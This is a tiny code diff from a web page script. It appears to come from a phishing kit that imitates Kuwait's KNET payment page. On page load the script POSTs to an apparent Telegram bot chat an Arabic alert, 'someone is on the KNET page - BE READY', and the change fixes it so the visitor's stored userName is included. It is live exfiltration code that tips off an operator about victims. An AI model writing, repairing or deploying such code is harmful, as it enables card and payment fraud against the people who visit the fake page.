@@ -2694,7 +2694,7 @@ document.addEventListener("DOMContentLoaded", function () {
       method: "POST",
       headers: { "Content-Type": "application/json" },body: JSON.stringify({
           chat_id: chatId,
-          text: `شخص في صفحة الكي نت - BE READY\n{localStorage.getItem('userName')}`,
+          text: `شخص في صفحة الكي نت - BE READY\n${localStorage.getItem('userName')}`,
         })
       });
     
